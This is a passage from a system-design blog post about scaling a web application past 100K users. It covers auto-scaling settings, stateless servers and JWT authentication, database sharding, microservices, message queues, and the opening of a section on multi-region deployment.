adjusting capacity stops working.</span></p><p>At 100K+ users, traffic patterns become less predictable. You might have:</p><ul><li><p>Daily peaks (morning in US, evening in EU)</p></li><li><p>Weekly patterns (higher on weekdays for B2B, weekends for consumer)</p></li><li><p>Marketing campaign spikes (10x traffic for hours)</p></li><li><p>Viral moments (100x traffic, unpredictable duration)</p></li></ul><p>At this point, manually adding and removing servers is no longer viable. You need infrastructure that reacts automatically.</p><p><span>This stage focuses on </span><strong>auto-scaling</strong><span> (automatically adjusting capacity) and ensuring your application is truly </span><strong>stateless</strong><span> (servers can be added or removed freely without data loss or user impact).</span></p><p>For auto-scaling to work, your application servers must be interchangeable. Any request can go to any server. Any server can be terminated without losing data. A new server can start handling requests immediately.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!qFmb!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!qFmb!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png 424w, https://substackcdn.com/image/fetch/$s_!qFmb!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png 848w, https://substackcdn.com/image/fetch/$s_!qFmb!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png 1272w, https://substackcdn.com/image/fetch/$s_!qFmb!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!qFmb!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png" width="1415" height="473" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/aac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:473,&quot;width&quot;:1415,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:129920,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!qFmb!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png 424w, https://substackcdn.com/image/fetch/$s_!qFmb!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png 848w, https://substackcdn.com/image/fetch/$s_!qFmb!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png 1272w, https://substackcdn.com/image/fetch/$s_!qFmb!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Faac6241d-eb41-47f6-a9cb-9f1217887ac4_1415x473.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>When a new server joins the cluster, it typically:</p><ol><li><p>Starts the application</p></li><li><p>Registers with the load balancer (or gets discovered)</p></li><li><p>Connects to Redis, database, and other shared services</p></li><li><p>Immediately starts handling requests</p></li></ol><p>When a server is removed:</p><ol><li><p>Load balancer stops sending new requests</p></li><li><p>In-flight requests complete (graceful shutdown)</p></li><li><p>Server terminates</p></li></ol><p>No data is lost, because nothing important is stored locally.</p><p>Auto-scaling adjusts capacity based on metrics. The scaling system continuously monitors metrics and adds or removes servers based on thresholds.</p><p>Most teams start with CPU-based scaling. It’s simple, works for most workloads, and is easy to reason about. Add queue-depth scaling for background job workers.</p><p>When configuring auto-scaling, you’ll set these parameters:</p><pre><code>Minimum instances: 2       # Always running, even at zero traffic
Maximum instances: 20      # Cost ceiling and resource limit
Scale-up threshold: 70%    # CPU percentage to trigger scale-up
Scale-down threshold: 30%  # CPU percentage to trigger scale-down
Scale-up cooldown: 3 min   # Wait time after scaling up before next action
Scale-down cooldown: 10 min # Wait time after scaling down
Instance warmup: 2 min     # Time for new instance to become fully operational</code></pre><p><strong>Important considerations:</strong></p><ul><li><p><strong>Minimum instances</strong><span>: Should be at least 2 for redundancy. If one fails, the other handles traffic while a replacement spins up.</span></p></li><li><p><strong>Cooldown periods</strong><span>: Prevent thrashing (rapidly scaling up and down). Scale-down cooldown is typically longer because removing capacity is riskier than adding it.</span></p></li><li><p><strong>Instance warmup</strong><span>: New servers need time to start, load code, warm up caches, establish database connections. Don’t count them toward capacity until they’re ready.</span></p></li><li><p><strong>Asymmetric scaling</strong><span>: Scale up aggressively (react quickly to load), scale down conservatively (don’t remove capacity too soon).</span></p></li></ul><p>At this scale, many teams move from session-based to token-based authentication using JWTs (JSON Web Tokens). With session-based auth, every request requires a session store lookup. With JWTs, authentication state is contained in the token itself.</p><p>A JWT has three parts:</p><pre><code>Header.Payload.Signature

eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxMjM0NTZ9.signature_here</code></pre><p>The payload contains claims like user ID, roles, and expiration. The signature ensures the token wasn’t tampered with. Any server can verify the signature using a shared secret key without querying a database.</p><p><strong>Trade-offs with JWTs:</strong></p><ul><li><p><strong>Pro</strong><span>: Truly stateless, no session store lookup for every request</span></p></li><li><p><strong>Pro</strong><span>: Works across services (microservices, mobile apps, third-party APIs)</span></p></li><li><p><strong>Con</strong><span>: Can’t invalidate individual tokens before expiry (user logs out, but token remains valid)</span></p></li><li><p><strong>Con</strong><span>: Token size adds to each request (500 bytes vs 32-byte session ID)</span></p></li></ul><p><span>A common pattern is </span><strong>short-lived access tokens</strong><span> (for example, 15 minutes) plus </span><strong>long-lived refresh tokens</strong><span> (for example, 7 days). That limits how long a compromised or stale token can be used.</span></p><p>At this point, your application tier scales elastically. Traffic spikes and more servers spin up. Traffic drops and they spin down.</p><p>But a new ceiling is coming: the database can only handle so many writes, the monolith becomes harder to change safely, and some operations are too slow to run synchronously. That’s when you bring in the heavy machinery.</p><p>With 500K+ users, you’ll hit new ceilings that the previous optimizations can’t solve:</p><ul><li><p>Writes overwhelm a single primary database, even if reads are offloaded to replicas.</p></li><li><p>The monolith becomes painful to ship. A small change to notifications forces a full redeploy of the entire application.</p></li><li><p>Previously fast operations start taking seconds because too much work is happening synchronously in the request path.</p></li><li><p>Different parts of the product need different scaling profiles. Search and feeds may need 10x the capacity of profile pages.</p></li></ul><p><span>This is where the heavy machinery comes in: </span><strong>database sharding</strong><span>, </span><strong>microservices</strong><span>, and </span><strong>asynchronous processing</strong><span> (message queues).</span></p><p>Read replicas solved read scaling, but writes all still go to one primary database. At high volume, this primary becomes the bottleneck. You’re limited by what one machine can handle in terms of:</p><ul><li><p>Write throughput (inserts, updates, deletes)</p></li><li><p>Storage capacity (even big disks have limits)</p></li><li><p>Connection count (even with pooling)</p></li></ul><p><span>Sharding splits your data across multiple databases based on a </span><strong>shard key</strong><span>. Each shard holds a subset of the data and handles both reads and writes for that subset.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!qmYA!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!qmYA!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png 424w, https://substackcdn.com/image/fetch/$s_!qmYA!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png 848w, https://substackcdn.com/image/fetch/$s_!qmYA!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png 1272w, https://substackcdn.com/image/fetch/$s_!qmYA!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!qmYA!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png" width="616" height="519.9615384615385" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:1229,&quot;width&quot;:1456,&quot;resizeWidth&quot;:616,&quot;bytes&quot;:123099,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!qmYA!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png 424w, https://substackcdn.com/image/fetch/$s_!qmYA!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png 848w, https://substackcdn.com/image/fetch/$s_!qmYA!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png 1272w, https://substackcdn.com/image/fetch/$s_!qmYA!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F325c5f29-9c73-402a-8520-6ae9b1f49d27_1542x1302.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!hkKK!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!hkKK!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png 424w, https://substackcdn.com/image/fetch/$s_!hkKK!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png 848w, https://substackcdn.com/image/fetch/$s_!hkKK!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png 1272w, https://substackcdn.com/image/fetch/$s_!hkKK!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!hkKK!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png" width="713" height="328" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:328,&quot;width&quot;:713,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:64085,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!hkKK!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png 424w, https://substackcdn.com/image/fetch/$s_!hkKK!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png 848w, https://substackcdn.com/image/fetch/$s_!hkKK!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png 1272w, https://substackcdn.com/image/fetch/$s_!hkKK!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F8e8d7a78-50d8-4211-9be6-c36adb77a042_713x328.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><blockquote><p><strong>Consistent hashing</strong><span> is a popular improvement over simple hash-based sharding. Instead of </span><code>hash(key) % num_shards</code><span>, you place keys on a ring. When you add a new shard, only keys adjacent to its position move, not all keys. This means adding a fourth shard moves ~25% of data instead of ~75%.</span></p></blockquote><p><span>Sharding is a </span><strong>one-way door</strong><span>. Once you shard:</span></p><ul><li><p>Cross-shard queries become expensive or impossible (joining data across shards)</p></li><li><p>Transactions spanning shards are complex (two-phase commit or give up on atomicity)</p></li><li><p>Schema changes must be applied to all shards</p></li><li><p>Operations (backups, migrations) multiply by shard count</p></li><li><p>Application code becomes more complex (shard routing logic)</p></li></ul><p>Before sharding, exhaust these options:</p><ol><li><p><strong>Optimize queries</strong><span>: Add missing indexes, rewrite slow queries, denormalize where helpful</span></p></li><li><p><strong>Vertical scaling</strong><span>: Upgrade to a bigger database server (more CPU, RAM, faster SSDs)</span></p></li><li><p><strong>Read replicas</strong><span>: If read-heavy, add replicas to handle reads</span></p></li><li><p><strong>Caching</strong><span>: Reduce load on database by caching frequently accessed data</span></p></li><li><p><strong>Archival</strong><span>: Move old data to cold storage (separate database, object storage)</span></p></li><li><p><strong>Connection pooling</strong><span>: Reduce connection overhead</span></p></li></ol><p>Only shard when you’re truly write-bound and a single node physically cannot handle your throughput, or when your dataset exceeds what fits on one machine.</p><p>As the product and team grow, a monolith becomes harder to evolve safely. Common signals you might benefit from microservices:</p><ul><li><p>A change to one area (like notifications) requires redeploying the entire app.</p></li><li><p>Teams can’t ship independently without coordinating every release.</p></li><li><p>Different parts of the app have different scaling needs (search needs 10 servers, profile viewing needs 2)</p></li><li><p>Engineers frequently conflict in the same codebase.</p></li><li><p>A bug in one subsystem takes down the whole application.</p></li></ul><p>Microservices split the application into independent services that communicate over the network.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!0Bo5!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!0Bo5!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png 424w, https://substackcdn.com/image/fetch/$s_!0Bo5!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png 848w, https://substackcdn.com/image/fetch/$s_!0Bo5!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png 1272w, https://substackcdn.com/image/fetch/$s_!0Bo5!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!0Bo5!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png" width="1456" height="655" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:655,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:164670,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!0Bo5!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png 424w, https://substackcdn.com/image/fetch/$s_!0Bo5!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png 848w, https://substackcdn.com/image/fetch/$s_!0Bo5!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png 1272w, https://substackcdn.com/image/fetch/$s_!0Bo5!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F77207148-e49e-448c-af06-a1f888a201ef_2346x1056.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Each service:</p><ul><li><p><strong>Owns its data</strong><span> (a database only it writes to directly)</span></p></li><li><p><strong>Deploys independently</strong><span> (ship notifications without touching checkout)</span></p></li><li><p><strong>Scales independently</strong><span> (search can scale separately from profiles)</span></p></li><li><p><strong>Uses fit-for-purpose tech</strong><span> (search might use Elasticsearch, payments might need Postgres with strong consistency)</span></p></li><li><p><strong>Exposes a clear API contract</strong><span> (other services integrate via stable endpoints)</span></p></li></ul><p><span>The trade-off is a big jump in operational complexity. The safest approach is to start with </span><strong>one extraction</strong><span>: pick the service with the cleanest boundaries and the clearest independent scaling needs. Avoid splitting into dozens of services upfront.</span></p><p>Not everything needs to happen synchronously in the request path. When a user places an order, some steps must complete immediately, while others can happen in the background.</p><p><strong>Must be synchronous:</strong></p><ul><li><p>Validate payment method</p></li><li><p>Check inventory</p></li><li><p>Create order record</p></li><li><p>Return order confirmation</p></li></ul><p><strong>Can be asynchronous:</strong></p><ul><li><p>Send confirmation email</p></li><li><p>Update analytics dashboard</p></li><li><p>Notify warehouse for fulfillment</p></li><li><p>Update recommendation engine</p></li><li><p>Sync to accounting system</p></li></ul><p><span>Message queues like </span><strong>Kafka</strong><span>, </span><strong>RabbitMQ</strong><span>, or </span><strong>SQS</strong><span> decouple producers from consumers. The order service publishes an event like </span><code>OrderPlaced</code><span>, and downstream systems consume it independently.</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!LUmw!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!LUmw!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png 424w, https://substackcdn.com/image/fetch/$s_!LUmw!,w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png 848w, https://substackcdn.com/image/fetch/$s_!LUmw!,w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png 1272w, https://substackcdn.com/image/fetch/$s_!LUmw!,w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/$s_!LUmw!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png" width="1087" height="600" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:600,&quot;width&quot;:1087,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:77942,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:&quot;https://blog.algomaster.io/i/173209644?img=https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png&quot;,&quot;isProcessing&quot;:false,&quot;align&quot;:null,&quot;offset&quot;:false}" alt="" srcset="https://substackcdn.com/image/fetch/$s_!LUmw!,w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png 424w, https://substackcdn.com/image/fetch/$s_!LUmw!,w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png 848w, https://substackcdn.com/image/fetch/$s_!LUmw!,w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png 1272w, https://substackcdn.com/image/fetch/$s_!LUmw!,w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F57410267-7412-4510-a448-8ba8ad0c5d5f_1087x600.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p><strong>Benefits of async processing:</strong></p><ul><li><p><strong>Resilience</strong><span>: If email service is down, messages queue up. Order still completes. Email sends when service recovers.</span></p></li><li><p><strong>Scalability</strong><span>: Consumers scale independently based on queue depth. Holiday rush? Add more warehouse notification processors without touching the orders service.</span></p></li><li><p><strong>Decoupling</strong><span>: The order service doesn’t need to know who consumes the event. You can add a new consumer (fraud detection, CRM sync) without changing the producer.</span></p></li><li><p><strong>Smoothing bursts</strong><span>: Queues absorb spikes and let downstream systems process at a sustainable rate instead of getting overloaded.</span></p></li><li><p><strong>Retry handling</strong><span>: Failed messages can be retried automatically. Dead letter queues capture messages that fail repeatedly for investigation.</span></p></li></ul><p>A common real-world pattern is “do the write now, do the heavy work later.” </p><p>For example, in social apps, creating a post is usually a fast write and an immediate success response. Expensive work like fan-out, indexing, notifications, and feed updates happens asynchronously, which is why you sometimes see small delays in like counts or feed propagation.</p><p>At this point, your architecture can handle massive scale within a single region. But your users aren’t all in one place, and neither should your infrastructure be. </p><p>Once you have users across continents, latency becomes noticeable, and a single datacenter becomes a single point of failure for your entire global user base.</p><p>With millions of users worldwide, new challenges emerge:</p><ul><li><p>Users in Australia experience 300ms latency hitting US servers</p></li><li><p>A datacenter outage (fire, network partition, cloud provider issue) takes down your entire service</p></li><li><p>Your database schema can’t efficiently serve both write-heavy real-time updates and read-heavy analytics dashboards</p></li><li><p>Different regions have different data residency requirements (GDPR in EU, data localization laws)</p></li></ul><p><span>This stage covers </span><strong>multi-region deployment</strong><span>, </span><strong>advanced caching</strong><span>, and </span><strong>specialized patterns</strong><span> like CQRS.</span></p><p>Deploying to multiple geographic regions achieves two main goals:</p><ol><li><p><strong>Lower latency</strong><span>: Users connect to nearby servers. Tokyo users hit Tokyo servers (20ms) instead of US servers (200ms).</span></p></li><li><p><strong>Disaster recovery</strong><span>: If one region fails, others continue serving traffic. True high availability.</span></p></li></ol><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/$s_!96qq!,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/$s_!96qq!,w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F1a69a915-b8e6-455c-ba12-c65b75dc7dba_2632x1016.png 424w, 